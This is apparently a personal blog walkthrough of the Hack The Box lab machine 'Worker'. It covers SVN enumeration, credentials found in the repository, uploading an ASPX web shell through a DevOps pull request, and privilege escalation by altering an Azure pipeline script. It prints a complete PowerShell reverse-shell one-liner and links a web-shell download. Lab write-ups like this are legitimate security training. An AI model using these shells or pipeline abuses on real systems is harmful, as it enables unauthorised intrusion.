---
layout: post
title: Worker HTB Walkthrough
---
![](/images/2021-2-12-Worker/0.png)

Hello guys and girls, lets hacks!!

Today we are going to be hacking a windows machine from hack the box called worker.

Let’s kick it off with nmap:

```
Nmap scan report for worker.htb (10.10.10.203)                                                        
Host is up (0.039s latency).                                                                          
Not shown: 998 filtered ports                                                                         
PORT     STATE SERVICE  VERSION                                                                       
80/tcp   open  http     Microsoft IIS httpd 10.0                                                      
| http-methods:                                                                                       
|_  Potentially risky methods: TRACE                                                                  
|_http-server-header: Microsoft-IIS/10.0                                                             
|_http-title: IIS Windows Server                                                                      
3690/tcp open  svnserve Subversion                                                                    
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                             
                                                                                                     
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .        │
# Nmap done at Sat Oct 10 13:15:06 2020 -- 1 IP address (1 host up) scanned in 13.62 seconds

```

As you can see, port 80 and 3690 are open. 

Port 80 had nothing interesting, so I started looking at 3690 which runs SVN, SVN is like Githib, SVN is used to manage and track changes to code and assets across projects.

So, let’s see what is in there: 

![](/images/2021-2-12-Worker/1.png)

Okay we found a bunch of stuff, so I just exported all the directory on to my local machine and spend some time going through it to find something interesting!!

![](/images/2021-2-12-Worker/2.png)

Hm!! Looks like something interesting.

![](/images/2021-2-12-Worker/3.png)

Okay, so we need some credentials. Usually I will think of brute force but its NTLM auth so it won’t be easy, so let’s look for creds.


Finally found something interesting!! A username and password.

![](/images/2021-2-12-Worker/4.png)


Now we will try to authenticate with it

Wallah!!, we got in


![](/images/2021-2-12-Worker/5.png)

Initially I found an upload button, so I tried uploading a shell, but it didn’t work so I looked around and decided to create a branch and upload my shell

![](/images/2021-2-12-Worker/6.png)
Now I created a branch called workerhtb under spectral, and uploaded my aspx shell.

You can download the shell from here: [shell]( https://dl.packetstormsecurity.net/UNIX/penetration/aspxshell.aspx.txt)

![](/images/2021-2-12-Worker/7.png)
Now create a pull request to deploy the aspx shell and approve the pull to get the file added to the master branch

![](/images/2021-2-12-Worker/8.png)

![](/images/2021-2-12-Worker/9.png)

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.249',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
![](/images/2021-2-12-Worker/10.png)


![](/images/2021-2-12-Worker/11.png)
![](/images/2021-2-12-Worker/12.png)
So, now that we have so many different users, I tried using one to log into the devops site.

![](/images/2021-2-12-Worker/13.png)


Oh, wait a minute. I can use evil-winrm to read the user.txt file.

Install evil-winrm :

gem install evil-winrm

then 

![](/images/2021-2-12-Worker/14.png)

Awesome !!


Now to privilege escalation…

As expected, “access denied”


![](/images/2021-2-12-Worker/15.png)

After spending some time in the box enumerating, I got nothing so, I decided to look at the devops site..


After spending a lot of time, I stumbled upon pipelines.

![](/images/2021-2-12-Worker/16.png)

So, I decided to create pipeline using azure..

I saw a field called “script” in the YAML deployment file , so immediately change the value into reading the root.txt. Technically, this should work !!


![](/images/2021-2-12-Worker/17.png)

However, for some reason it didn’t, so I tried to change the admin password  

![](/images/2021-2-12-Worker/18.png)

Yikess :/  I should start using strong passwords **silly me**

![](/images/2021-2-12-Worker/19.png)

I re-did the same thing, now with a stronger password:

![](/images/2021-2-12-Worker/20.png)


W00t Wo0T




